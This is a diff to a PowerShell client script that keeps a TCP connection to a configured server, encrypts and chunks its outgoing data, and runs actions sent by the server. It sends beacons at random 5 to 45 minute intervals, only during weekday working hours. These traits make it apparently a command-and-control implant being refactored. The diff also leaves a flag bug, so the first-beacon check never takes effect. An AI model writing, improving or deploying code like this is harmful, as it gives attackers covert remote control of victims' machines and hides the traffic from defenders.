@@ -4,6 +4,7 @@ $global:beaconIntervalInstance = $null
 $global:logStream = $null
 $global:startTime = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()
 $global:exitProcess = $false
+$global:sentFirstBeacon = $false
 $global:SESSION_ID = $null
 $global:LOGGING = $true
 $global:CVER = "0.2.0"
@@ -23,34 +24,6 @@ $global:RETRY_INTERVALS = @(
 $global:BEACON_MIN_INTERVAL = 5 * 60 * 1000
 $global:BEACON_MAX_INTERVAL = 45 * 60 * 1000
 
-# Create a writable stream for logging
-if ($global:LOGGING) {
-    $logPath = 'logs\client.log'
-    $logDir = [System.IO.Path]::GetDirectoryName($logPath)
-    if (-not $logDir -or -not (Test-Path -Path $logDir)) {
-        New-Item -ItemType Directory -Path $logDir -Force | Out-Null
-    }
-    $global:logStream = New-Object System.IO.StreamWriter($logPath, $true)
-}
-
-# Handle SIGINT (Ctrl+C)
-$ctrlc = Register-ObjectEvent -InputObject ([Console]) -EventName CancelKeyPress -Action {
-    Write-Warning 'Received SIGINT (Ctrl+C), shutting down gracefully'
-    # close log stream
-    Close-LogStream
-
-    if ($global:beaconIntervalInstance) {
-        $global:beaconIntervalInstance.Stop()
-        $global:beaconIntervalInstance.Dispose()
-    }
-    if ($global:client) {
-        $global:client.Close()
-    }
-
-    # Exit
-    [Environment]::Exit(1)
-}
-
 function Write-Log {
     [CmdletBinding()]
     param(
@@ -61,7 +34,7 @@ function Write-Log {
     if ($global:LOGGING -and $global:logStream) {
         try {
             $timestamp = (Get-Date).ToUniversalTime().ToString("o")
-            $global:logStream.WriteLine("[$timestamp] $message")
+            $global:logStream.WriteLine("[$timestamp] $message") | Out-Null
             $global:logStream.Flush()
         }
         catch {
@@ -103,21 +76,23 @@ function Protect-Data {
         [Parameter(Mandatory=$true)]
         [ValidateNotNullOrEmpty()]
         [string]$data,
-
         [Parameter(Mandatory=$true)]
         [ValidateNotNullOrEmpty()]
         [string]$sharedKey
     )
     try {
-        $salt = New-Object byte[] 32
-        $rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
-        $rng.GetBytes($salt)
+        $salt = [byte[]]::new(32)
+        [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($salt)
 
-        $iv = New-Object byte[] 16
-        $rng.GetBytes($iv)
+        $iv = [byte[]]::new(16)
+        [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($iv)
 
-        $keyDerivation = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($sharedKey, $salt, 200000)
-        $key = $keyDerivation.GetBytes(32)
+        $key = [System.Security.Cryptography.Rfc2898DeriveBytes]::new(
+            $sharedKey, 
+            $salt, 
+            200000, 
+            [System.Security.Cryptography.HashAlgorithmName]::SHA512
+        ).GetBytes(32)
 
         $aes = [System.Security.Cryptography.Aes]::Create()
         $aes.Key = $key
@@ -129,8 +104,8 @@ function Protect-Data {
         $dataBytes = [Text.Encoding]::UTF8.GetBytes($data)
         $encryptedData = $encryptor.TransformFinalBlock($dataBytes, 0, $dataBytes.Length)
 
-        $hmac = New-Object System.Security.Cryptography.HMACSHA256($key)
-        $authTag = $hmac.ComputeHash($encryptedData)
+        $hmac = [System.Security.Cryptography.HMACSHA256]::new($key)
+        $authTag = $hmac.ComputeHash($iv + $encryptedData)
 
         $saltBase64 = [Convert]::ToBase64String($salt)
         $ivBase64 = [Convert]::ToBase64String($iv)
@@ -150,7 +125,6 @@ function Unprotect-Data {
         [Parameter(Mandatory=$true)]
         [ValidateNotNullOrEmpty()]
         [string]$encrypted,
-
         [Parameter(Mandatory=$true)]
         [ValidateNotNullOrEmpty()]
         [string]$sharedKey
@@ -165,8 +139,12 @@ function Unprotect-Data {
         $iv = [Convert]::FromBase64String($parts[1])
         $encryptedData = [Convert]::FromBase64String($parts[2])
         
-        $keyDerivation = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($sharedKey, $salt, 200000)
-        $key = $keyDerivation.GetBytes(32)
+        $key = [System.Security.Cryptography.Rfc2898DeriveBytes]::new(
+            $sharedKey, 
+            $salt, 
+            200000, 
+            [System.Security.Cryptography.HashAlgorithmName]::SHA512
+        ).GetBytes(32)
         
         $aes = [System.Security.Cryptography.Aes]::Create()
         $aes.Key = $key
@@ -180,7 +158,7 @@ function Unprotect-Data {
         return [Text.Encoding]::UTF8.GetString($decryptedData)
     }
     catch {
-        Write-Log "Error in Unprotect-Data: $($_.Exception.Message)$_"
+        Write-Log "Error in Unprotect-Data: $($_.Exception.Message)"
     }
 }
 
@@ -202,26 +180,44 @@ function Send-Command {
     param (
         [Parameter(Mandatory=$true)]
         [ValidateNotNullOrEmpty()]
-        [string]$response
+        $response
     )
-    $encrypted = Protect-Data -data $response -sharedKey $global:SESSION_ID
-    $writer = New-Object System.IO.StreamWriter($global:client)
-    if ($encrypted.Length -ge $global:CHUNK_SIZE) {
-        while ($encrypted.Length -gt 0) {
-            $chunk = $encrypted.Substring(0, [Math]::Min($global:CHUNK_SIZE, $encrypted.Length))
-            $encrypted = $encrypted.Substring($chunk.Length)
-            if ($encrypted.Length -eq 0) {
-                $chunk += '--FIN--'
+    try {
+        if($global:client.Connected) {
+            # encrypt the payload
+            $encrypted = Protect-Data -data ($response | ConvertTo-Json -Depth 4) -sharedKey $global:SESSION_ID
+
+            if ($encrypted) {
+
+                # get stream
+                $tcpStream = $global:client.GetStream()
+                $writer = [System.IO.StreamWriter]::new($tcpStream)
+                $writer.AutoFlush = $true
+
+                if ($encrypted.Length -ge $global:CHUNK_SIZE) {
+                    while ($encrypted.Length -gt 0) {
+                        $chunk = $encrypted.Substring(0, [Math]::Min($global:CHUNK_SIZE, $encrypted.Length))
+                        $encrypted = $encrypted.Substring($chunk.Length)
+                        if ($encrypted.Length -eq 0) {
+                            $chunk += '--FIN--'
+                        }
+                        Write-Log "Sent Chunk: $chunk"
+                        $writer.Write([System.Text.Encoding]::UTF8.GetBytes($chunk), 0, $chunk.Length)
+                    }
+                }
+                else {
+                    Write-Log "Sent Data: $encrypted"
+                    $writer.Write([System.Text.Encoding]::UTF8.GetBytes($encrypted), 0, $encrypted.Length)
+                }
+
+                $writer.Close()
+                $writer.Dispose();
             }
-            Write-Log "Sent Chunk: $chunk"
-            $writer.Write([System.Text.Encoding]::UTF8.GetBytes($chunk), 0, $chunk.Length)
         }
     }
-    else {
-        Write-Log "Sent Data: $encrypted"
-        $writer.Write([System.Text.Encoding]::UTF8.GetBytes($encrypted), 0, $encrypted.Length)
+    catch {
+        Write-Log "Exception on Send-Command: $($_.Exception.Message)"
     }
-    $writer.Dispose();
 }
 
 function Send-Beacon {
@@ -458,39 +454,35 @@ function Read-Action {
 }
 
 function Connect-ToServer {
-    $connectionRetries = 0
-
-    while (-not $global:exitProcess) {
+    $connectionRetries = 0;
+    while(-not $global:exitProcess) {
         try {
-            $global:client = New-Object System.Net.Sockets.TcpClient
-            $global:client.Connect($global:SERVER_ADDRESS, $global:SERVER_PORT)
-            Write-Log "Client $global:CVER connected."
-            Get-SessionId
-
-            # Get tcp stream
-            $tcpStream = $global:client.GetStream()
-
-            Send-Beacon
-            $beaconInterval = Get-Random -Minimum $global:BEACON_MIN_INTERVAL -Maximum $global:BEACON_MAX_INTERVAL
-            $global:beaconIntervalInstance = New-Object System.Timers.Timer($beaconInterval)
-            $global:beaconIntervalInstance.AutoReset = $true
-            $global:beaconIntervalInstance.Enabled = $true
-
-            Register-ObjectEvent -InputObject $global:beaconIntervalInstance -SourceIdentifier BeaconInterval -Action {
-                $now = Get-Date
-                $day = $now.DayOfWeek.value__
-                $hour = $now.Hour
-                if ($day -ge 1 -and $day -le 5 -and $hour -ge 7 -and $hour -le 19) {
-                    Send-Beacon
+            if ($global:client -eq $null) {
+                $global:client = New-Object System.Net.Sockets.TcpClient($global:SERVER_ADDRESS, $global:SERVER_PORT)
+                if ($global:client.Connected) {
+                    Write-Log "Client $global:CVER connected."
+                    Get-SessionId
                 }
             }
+            if (-not $global:client.Connected) {
+                $global:client.Connect($global:SERVER_ADDRESS, $global:SERVER_PORT)
+            }
 
-            $buffer = New-Object byte[] $global:CHUNK_SIZE
-            $reader = New-Object System.IO.StreamReader($tcpStream)
             while ($global:client.Connected)
             {
+                # Get tcp stream
+                $tcpStream = $global:client.GetStream()
+
+                if (-not $global:sentFirstBeacon) {
+                    Send-Beacon
+                    $global:sentFirstBeacon = $false
+                }
+
+                $buffer = New-Object byte[] $global:CHUNK_SIZE
+                $reader = [System.IO.StreamReader]::new($tcpStream)
+
                 # Parse data received
-                while ($global:client.DataAvailable) {
+                while (($reader.Peek() -ne -1) -or ($global:client.Available)) {
                     $bytesRead = $reader.Read($buffer, 0, $buffer.Length)
                     if ($bytesRead -eq 0) { break }
                     $data = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $bytesRead)
@@ -500,19 +492,24 @@ function Connect-ToServer {
                         Read-Action -action $action
                     }
                 }
+
+                $reader.Close()
+                $reader.Dispose()
             }
-            $buffer.Dispose()
-            $reader.Dispose()
         }
         catch {
             Write-Log "Connect-ToServer exception occurred: $($_.Exception.Message)"
             $global:exitProcess = $true
         }
         finally {
-            Write-Log 'Connection to server closing. Retrying...'
+            Write-Log "Connection to server closing. Retrying..."
+
+            # close the client to reconnect
+            $global:client.Close()
+
             $connectionRetries++
             if ($connectionRetries -gt $global:MAX_RETRIES) {
-                Write-Log 'Max retries reached. Exiting.'
+                Write-Log "Max retries reached. Exiting."
                 $global:exitProcess = $true
             }
             else {
@@ -525,6 +522,48 @@ function Connect-ToServer {
 }
 
 try {
+    # Create a writable stream for logging
+    if ($clientConfig.Logging) {
+        $logPath = 'logs\client.log'
+        $logDir = [System.IO.Path]::GetDirectoryName($logPath)
+        if (-not $logDir -or -not (Test-Path -Path $logDir)) {
+            New-Item -ItemType Directory -Path $logDir -Force | Out-Null
+        }
+        $global:logStream = [System.IO.StreamWriter]::new($logPath, $true)
+    }
+
+    # Create beacon interval
+    if ($global:beaconIntervalInstance -eq $null) {
+        $beaconInterval = Get-Random -Minimum $global:BEACON_MIN_INTERVAL -Maximum $global:BEACON_MAX_INTERVAL
+        $global:beaconIntervalInstance = New-Object System.Timers.Timer($beaconInterval)
+        $global:beaconIntervalInstance.AutoReset = $true
+        $global:beaconIntervalInstance.Enabled = $true
+    }
+
+    # Handle sending periodic beacon
+    $beacon = Register-ObjectEvent -InputObject $global:beaconIntervalInstance -EventName Elapsed -SourceIdentifier BeaconInterval -Action {
+        $now = Get-Date
+        if ($now.DayOfWeek -in 1..5 -and $now.Hour -in 7..19) {
+            Send-Beacon
+        }
+    }
+
+    # Handle SIGINT (Ctrl+C)
+    $ctrlc = Register-ObjectEvent -InputObject ([Console]) -EventName CancelKeyPress -Action {
+        Write-Warning 'Received SIGINT (Ctrl+C), shutting down gracefully'
+        # close log stream
+        Close-LogStream
+
+        if ($global:beaconIntervalInstance) {
+            $global:beaconIntervalInstance.Stop()
+            $global:beaconIntervalInstance.Dispose()
+        }
+        if ($global:client) {
+            $global:client.Close()
+            $global:client.Dispose()
+        }
+    }
+
     # Connect
     Connect-ToServer
 }
@@ -538,10 +577,9 @@ finally {
     }
     if ($global:client) {
         $global:client.Close()
+        $global:client.Dispose()
     }
 
     $ctrlc | Remove-Job -Force
-
-    # Exit
-    [Environment]::Exit(0)
+    $beacon | Remove-Job -Force
 }
